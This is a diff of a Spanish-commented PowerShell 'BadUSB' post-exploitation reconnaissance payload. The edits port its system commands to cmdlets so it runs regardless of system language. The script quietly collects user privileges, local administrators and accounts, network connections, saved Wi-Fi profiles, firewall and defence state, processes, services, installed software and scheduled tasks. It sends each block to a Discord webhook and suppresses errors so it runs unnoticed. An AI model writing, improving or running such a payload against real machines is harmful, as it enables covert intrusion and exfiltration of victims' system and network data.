@@ -1,4 +1,4 @@
-# ============================================================
+﻿# ============================================================
 # BadUSB Recon - Payload de reconocimiento post-explotacion
 # ------------------------------------------------------------
 # Entorno : Windows 10/11, PowerShell 5.1+
@@ -10,6 +10,12 @@
 param(
     [string]$Webhook
 )
+# Forzar cultura en-US para cmdlets de PowerShell
+# (los comandos nativos como net/netsh siguen en el idioma del SO)
+try {
+    [System.Threading.Thread]::CurrentThread.CurrentUICulture = 'en-US'
+    [System.Threading.Thread]::CurrentThread.CurrentCulture   = 'en-US'
+} catch { }
 
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -117,8 +123,11 @@ $arch   = $env:PROCESSOR_ARCHITECTURE
 $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
 $grupos = (whoami /groups | Out-String).Trim()
 $privs  = (whoami /priv   | Out-String).Trim()
-$admins = (net localgroup administrators | Out-String).Trim()
-$users  = (net user | Out-String).Trim()
+$admins = (Get-LocalGroupMember -SID "S-1-5-32-544" -ErrorAction SilentlyContinue |
+           Select-Object -ExpandProperty Name | Out-String).Trim()
+$users = (Get-LocalUser -ErrorAction SilentlyContinue |
+          Select-Object Name, Enabled, LastLogon |
+          Out-String).Trim()
 
 $bloque1 = @"
 Usuario:  $u
@@ -150,7 +159,9 @@ $arp     = (arp -a | Out-String).Trim()
 $dns     = (Get-DnsClientServerAddress -AddressFamily IPv4 | Out-String).Trim()
 $netstat = (netstat -ano | Select-String "ESTABLISHED" | Select -First 40 | Out-String).Trim()
 $wifi    = (netsh wlan show profiles | Out-String).Trim()
-$fw      = (netsh advfirewall show allprofiles state | Out-String).Trim()
+$fw = (Get-NetFirewallProfile -ErrorAction SilentlyContinue |
+       Select-Object Name, Enabled |
+       Out-String).Trim()
 
 $bloque2 = @"
 IPs:        $ip
@@ -201,10 +212,14 @@ Send-Discord -Title "🛡️ BLOQUE 3 — Defensas" -Body $bloque3
 # ============================================================
 $proc   = (Get-Process | Sort-Object -Property WS -Descending | Select-Object -First 25 Name, Id, WS | Out-String).Trim()
 $serv   = (Get-Service | Where-Object Status -eq "Running" | Select-Object -First 50 Name, DisplayName | Out-String).Trim()
-$soft   = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
-            Select-Object DisplayName, DisplayVersion, Publisher |
-            Where-Object DisplayName | Out-String).Trim()
-$tasks  = (schtasks /query /fo LIST /v | Select-String "TaskName|Run As User|Task To Run" | Select-Object -First 60 | Out-String).Trim()
+$soft = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
+         Where-Object DisplayName |
+         Select-Object DisplayName, DisplayVersion, Publisher |
+         Out-String).Trim()
+$tasks = (Get-ScheduledTask -ErrorAction SilentlyContinue |
+          Where-Object State -eq "Ready" |
+          Select-Object -First 60 TaskName, TaskPath |
+          Out-String).Trim()
 
 $bloque4 = @"
 --- TOP PROCESOS ---
